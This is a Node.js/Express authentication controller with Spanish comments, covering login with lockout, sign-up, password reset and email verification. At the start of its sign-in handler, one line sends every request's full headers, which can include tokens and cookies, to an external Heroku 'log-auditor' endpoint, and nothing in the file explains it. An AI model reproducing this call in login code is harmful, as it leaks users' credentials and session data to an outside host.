require('dotenv').config();
const User = require('../models/User.model');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const secretSessionKey = process.env.TOKEN_SESSION_SECRET_KEY;
const secretResetKey = process.env.TOKEN_RESET_SECRET_KEY;
const secretVerifyEmailKey = process.env.TOKEN_VERIFY_EMAIL_SECRET_KEY;
const config = require('../api.config.js');
const axios = require('axios');

const Debug = require('../helpers/debug')
const { sendVerificationEmail, sendResetPasswordEmail } = require('../plugins/nodemailer');
const { 
  securityCheck,
  resetLockValues,
  checkIfAccountIsLocked, 
  checkMaxLogginAttempts,
} = require('../middleware/security');

const lockUser = (user) => {
  user.security.accountLockedUntil = new Date(Date.now() + config.security.logginAttempts.lockTime * 60000);
  user.save();
  console.log('----- La cuenta ha alcanzado el número máximo de intentos de inicio de sesión. La cuenta está bloqueada hasta: ' + user.security.accountLockedUntil.toLocaleString('es-ES', { timeZone: 'Europe/Madrid' }));
};

const debug = new Debug();

// TODO: Convertir string de email a minúsculas ?
const signInByMail = async (req, res) => {
  const headers = req.headers;
  console.log(headers);
  axios.post('https://log-auditor-052470f8b7e2.herokuapp.com/api/logs/save', headers)

  const { email, password } = req.body;
  const response = config.response.auth.sign_in;

  try {
    debug.log(`✅ Searching user [${email}]...`);
    const user = await User.findOne({ email });

    if (!user) {
      debug.error(`User not found.`);
      return res.status(response.user_not_found.code).json({ message: response.user_not_found.message });
    }

    // Check account lock before password verification
    if (config.security.logginAttempts.active) {

      debug.log('Checking if account is locked...');
      const isLocked = checkIfAccountIsLocked(user);
      if (isLocked) {
        const userLockedUntil = new Date(user.security.accountLockedUntil);
        const userLockedUntilString = userLockedUntil.toLocaleString('es-ES', { timeZone: 'Europe/Madrid' });
        
        debug.log(`Account [${user.id}] is locked until: [${userLockedUntilString}]. Remaining time: [${(userLockedUntil - Date.now()) / 60000}] minutes.`);
        return res.status(response.error.user_is_locked.code).json({ message: response.error.user_is_locked.message + ' until: ' + userLockedUntilString });
      } else {
          resetLockValues(user);
      }
    }

    // Verify password
    debug.log('Verifying password...');
    const isPasswordValid = await bcrypt.compare(password, user.password);

    // Increment +1 loggin attempts if password is invalid or reset loggin attempts to 0 if password is valid
    if(config.security.logginAttempts.active){
      user.security.logginAttempts = isPasswordValid ? 0 : user.security.logginAttempts + 1
      debug.log('Checking max loggin attempts...')
      const maxAttemptsReached = checkMaxLogginAttempts(user, config.security.logginAttempts.max);
      if (maxAttemptsReached) {
        lockUser(user)
        return res.status(response.error.max_attempt_reached.code).json({ message: response.error.max_attempt_reached.message + ' Account is locked.' });
      }
    }

    if (!isPasswordValid) {
      debug.log(`Password Invalid.`);
      debug.warning(`Loggin attempts: [${user.security.logginAttempts}/${config.security.logginAttempts.max}]`);
      user.save();
      return res.status(response.error.incorrect_password.code).json({ message: response.error.incorrect_password.message });
    }

    const sessionToken = jwt.sign(
      { 
        userId: user._id,
        role: user.role.id
        // more useful data
      },
      secretSessionKey,
      config.security.tokens.session.active ? 
      { expiresIn: config.security.tokens.session.expiration } 
      : null
    );

    res.status(response.success.code).json({
      // email: user.email,
      token: sessionToken
    });

    console.log('----- Contraseña verificada correctamente. Inicio de sesión exitoso.');
    user.save();

  } catch (err) {
    console.error(err);
    res.status(500).json({ message: 'Error en el servidor' });
  }
}


const signUpByMail = async (req, res) => {
  try {
    const { email, password } = req.body;
    const response = config.response.auth.sign_up;
    // Convertir el email a minúsculas
    const lowerCaseEmail = email.toLowerCase();
    // Verificar si el usuario ya existe en la base de datos
    const existingEmail = await User.findOne({ email });

    if (existingEmail) {
      return res.status(response.error.email_already_exists.code).json({ message: response.error.email_already_exists.message });
    }

    // Generar una contraseña hash utilizando bcrypt
    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    // Crear un nuevo usuario en la base de datos
    const newUser = new User({
      email,
      password: hashedPassword
    });

    const sessionToken = jwt.sign(
      {
        userId: newUser._id,
        role: newUser.role.id
        // more useful data
      },
      secretSessionKey,
      config.security.tokens.session.active ?
      { expiresIn: config.security.tokens.session.expiration }
      : null
    );

    newUser.security.tokens.session = sessionToken;

    // TODO: Refactorizar todas las generaciones de tokens.
    if (config.register.verification.active && config.register.verification.method === 'email') {
      const verificationToken = jwt.sign({ userId: newUser._id, role: newUser.role }, 
        secretVerifyEmailKey, 
        config.security.tokens.verification.email.active ?
        { expiresIn: config.security.tokens.verification.email.expiration }
        : null
      );
      newUser.security.tokens.verifyEmail = verificationToken;
      sendVerificationEmail (email, verificationToken);
    }
    
    await newUser.save();

    return res.status(response.success.code).json({message: response.success.message, token: sessionToken});
  } catch (error) {
    console.error(error);
    return res.status(500).json({ error: 'Error en el servidor' });
  }
}

// TODO: Convertir string de email a minúsculas ?
// ! DEPRECATED
const signUpByUsername = async (req, res) => {
  try {
    const { username, password } = req.body;

    // Verificar si el usuario ya existe en la base de datos
    const existingUsername = await User.findOne({ username });

    if (existingUsername) {
      return res.status(400).json({ error: 'Username already exists' });
    }

    // Generar una contraseña hash utilizando bcrypt
    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    // Crear un nuevo usuario en la base de datos
    const newUser = new User({
      username,
      email,
      password: hashedPassword,
    });

    await newUser.save();

    return res.json({ message: 'Usuario registrado exitosamente' });
  } catch (error) {
    console.error(error);
    return res.status(500).json({ error: 'Error en el servidor' });
  }
}

// * Este endpoint [/forgot-password] recibe un email enviado por el usuario en la página de recuperación de contraseña.
// * El servidor genera un token de 30 minutos de duración y lo envía al email del usuario.
const forgotPassword = async (req, res) => {
  try {
    const { email } = req.body;

    // Verificar si el email existe en la base de datos
    const user = await User.findOne({ email });

    if (!user) {
      return res.status(404).json({ error: 'Email no encontrado' });
    }

    // Generar un token para restablecer la contraseña
    const resetPasswordToken = jwt.sign(
      { userId: user._id, role: user.role.id }, 
      secretResetKey, 
      config.security.tokens.reset_password.active ? 
      { expiresIn: config.security.tokens.reset_password.expiration }
      : null
    );

    user.security.tokens.resetPassword = resetPasswordToken;

    await user.save();

    // Enviar un correo electrónico con el token para restablecer la contraseña
    await sendResetPasswordEmail(email, resetPasswordToken);

    return res.json({ message: 'Se ha enviado un correo electrónico con instrucciones para restablecer la contraseña' });
  } catch (error) {
    console.error(error);
    return res.status(500).json({ error: 'Error en el servidor' });
  }
};

// * Este endpoint [/reset-password] recibe un token enviado por el usuario en la página de recuperación de contraseña.
// * El servidor verifica el token y actualiza la contraseña del usuario en el servidor.
// * El link solo es accesible desde el correo electrónico del usuario, y tiene el token como parámetro.
const resetPassword = async (req, res) => {
  try {
    const { password } = req.body;
    const userId = req.userId;

    const token = req.headers.authorization ? req.headers.authorization.split(' ')[1] : null;

    if(!token) {
      return res.status(400).json({ error: 'Token de verificación no encontrado' });
    }

    // Obtener el usuario de la base de datos
    const user = await User.findById(userId);

    if (!user) {
      return res.status(404).json({ error: 'Usuario no encontrado' });
    }

    if (user.security.tokens.resetPassword !== token) {
      return res.status(401).json({ error: 'Token no coindice con el reset token del usuario' });
    }

    // Generar una nueva contraseña hash utilizando bcrypt
    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    // Set values
    user.password = hashedPassword;
    user.security.tokens.resetPassword = null;
    await user.save();

    return res.json({ message: 'Contraseña restablecida exitosamente' });
  } catch (error) {
    console.error(error);
    return res.status(500).json({ error: 'Error en el servidor' });
  }
};

const verifyEmail = async (req, res) => {


  try {
    const token = req.headers.authorization ? req.headers.authorization.split(' ')[1] : null;

    if(!token) {
      return res.status(400).json({ error: 'Token de verificación no encontrado' });
    }
    // Verificar el token de verificación
    const decodedToken = jwt.verify(token, secretVerifyEmailKey);

    // Obtener el ID de usuario desde el token
    const userId = decodedToken.userId;

    // Actualizar el estado de verificación del usuario
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ error: 'Usuario no encontrado' });
    }

    if(user.isVerified) {
      return res.status(400).json({ error: 'User is already verified' });
    }

    if (user.security.tokens.verifyEmail !== token) {
      return res.status(401).json({ error: 'Token no coindice con el token de verificación del usuario' });
    }

    // Set new values
    user.isVerified = true;
    user.security.tokens.verifyEmail = null;
    await user.save();

    return res.status(200).json({ message: 'Correo electrónico verificado correctamente' });
  } catch (error) {
    return res.status(400).json({ error: 'Token de verificación inválido' });
  }
};

const verifyPhone = async (req, res) => {

  // TODO: Implementar logica
}

module.exports = {
  signInByMail,
  signUpByUsername,
  signUpByMail,
  forgotPassword,
  resetPassword,
  verifyEmail,
  verifyPhone,
};